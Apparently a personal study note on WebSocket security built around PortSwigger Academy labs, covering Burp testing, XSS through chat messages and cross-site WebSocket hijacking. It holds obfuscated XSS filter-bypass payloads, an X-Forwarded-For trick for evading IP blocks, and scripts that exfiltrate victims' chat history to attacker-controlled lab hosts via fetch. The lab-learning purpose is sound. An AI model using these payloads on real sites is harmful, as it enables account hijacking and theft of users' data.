![[WebSockets.jpg]]
# Recon

WebSockets are initiated over HTTP and provide long-lived connections with asynchronous communication bi-directionally. They're used for performing user actions and transmitting sensitive info.

To find WebSocket vulnerabilities, it involves manipulating them in ways the app does not expect by:

- Intercepting and modifying WebSocket messages
- Replay and generate new WebSocket messages
- Manipulate WebSocket connections

Burp Proxy has a WebSockets history tab that includes WebSockets messages. Individual messages can be replayed via Burp Repeater by sending a WebSocket message to Repeater. There are situations where it may be necessary to manipulate the handshake itself such as needing to establish a new connection, or tokens/other data may need updated.

Repeater has a pencil icon that attaches you to an existing connected WebSocket, clone one or reconnect to a disconnected one.

Look for any web security vulnerability that can arise in normal apps such as:

- User-supplied input transmitted to the server processed in unsafe ways (SQLi, XXE)
- Blind vulnerabilities reached via WebSockets may only be detectable using OAST techniques
- If attacker-controlled data is transmitted via WebSockets to other users, it may lead to XSS
# Manipulating WebSocket Messages

Suppose an app uses sockets to send chat messages. When typing a message, a WebSocket message is sent to the server:

```json
{"message":"Hello Carlos"}
```

The contents are transmitted to another chat user via WebSockets and rendered in browser:

```html
<td>Hello Carlos</td>
```

If no other input processing or defenses are in place, a PoC XSS attack can be submitted via the following:

```json
{"message":"<img src=1 onerror='alert(1)'>"}
```

Try to determine if any filtering takes place such as backslash escaping, HTML encoding angle brackets or other forms of encoding. Bypasses may be available. If forward slashes - `/` - are escaped, try using XSS payloads that do not require one such as the img above.
# Manipulating Handshake

These vulnerabilities involve design flaws like:

- Misplaced trust in HTTP headers to perform security decisions - i.e. `X-Forwarded-For`
- Flaws in session handling since the session context is generally determine by the session context of the handshake
- Attack surface introduced by custom HTTP headers

If WebSockets block your IP after sending a malicious alert, attempt to add a match and replace rule for `X-Forwarded-For` and session handling rules along with Request Randomizer to send a random value every request and potentially bypass the blacklist.

Try to analyse what triggers the blacklisting - keywords, special characters, full payloads, etc. Try various different payloads and see what works, including:

```html
<img src=1 oNeRrOr=alert`1`>
```

```html
<img src=0 oNeRrOr=window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])>
```

Encoding may also be required on the keywords that trigger the alert:

```html
<img src=0 oNeRrOr=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
```

```html
<img src=x OnErRoR=&#97;&#108;&#101;&#114;&#116;(1)>"}
```
# Cross-Site WebSocket Hijacking

Vulnerabilities arise when an attacker makes a cross-domain WebSocket connection from a site that the attacker controls - known as cross-site WebSocket hijacking attack and involves exploiting CSRF on a handshake. 

It arises when the handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values. Attackers create a web page on a domain which establishes a cross-site WebSocket connection. The app handles the connection in the context of the victim's user session.

Attacker sends arbitrary messages to the server via the connection and read the contents of messages that are received back from the server - attacker gains two-way interaction with the compromised app.

First, review the handshakes and determine if they are vulnerable. For normal conditions, you need to find a message that relies solely on cookies for session handling and does not use any tokens or unpredictable values such as:

```html
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

If vulnerable, then a cross-site request is performed to open a WebSocket and can do things like:

- Sending WebSocket messages to perform unauthorized actions on behalf of the victim user
- Sending WebSocket messages to retrieve sensitive data
- Sometimes, just waiting for incoming messages to arrive containing sensitive data


Try interacting with the bot and refreshing the page. If the chat history persists, it likely uses a session cookie to track the live chats. Check if this session token has the SameSite flag. Attempt to resend the READY message  and check if the chat history returns. 

Also check that the /chat endpoint has no unpredictable token values. Launch an attack:

1. Create an exploit page that contains a payload
2. JS will open the WebSocket, send a READY message, grab the chat history and send it back to us
3. Send link to victim
4. Victim opens connection and session cookie is sent along
5. Chat history sent to web server

As an example, the payload below can be used to retrieve sensitive information from the application that belongs to another user. When we send the "READY" command to the server via the WebSocket message, all the past chat messages will be received. 

When the messages are received from the server, they will be sent to attacker's server. This is possible as cross-site WebSocket hijacking attacks, allows for 2-way interaction, unlike standard CSRF attacks.

Host the following in the exploit server to send a POST request to Collaborator:

```html
<script>
    var ws = new WebSocket('wss://VULNERABLE-WEBSOCKET-URL/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

Or the following to send a GET request with base64 encoded data to the exploit server:

```html
<script>
var ws = new WebSocket(
  "wss://0a29006304c9f2fa838619a4002d0016.web-security-academy.net/chat"
);

ws.onopen = function() {
  ws.send("READY");
};

ws.onmessage = function (event) {
  fetch(
    "https://exploit-0a1c004e04fcf26c83b0185d016700dc.exploit-server.net/exploit?message=" +
      btoa(event.data)
  );
};
</script>
```

- Opens a new WebSocket with specified URL
- When opened, run a function that sends the READY message
- Receive back info from the server and use fetch to send request to attacker endpoint

An example exploitation payload - although this does not work in the labs, this is something that can be done to inject XSS through web socket messages to attack other users. The "message" parameter in the lab was used to communicate/send messages to the server through web socket.

```html
<script>
    var ws = new WebSocket('wss://0a97008101b00a8.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("{\"message\":\"<img src=x onerror=alert(1)>\"}");
    };
    ws.onmessage = function(event) {
        fetch('https://a8jc1jg75.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

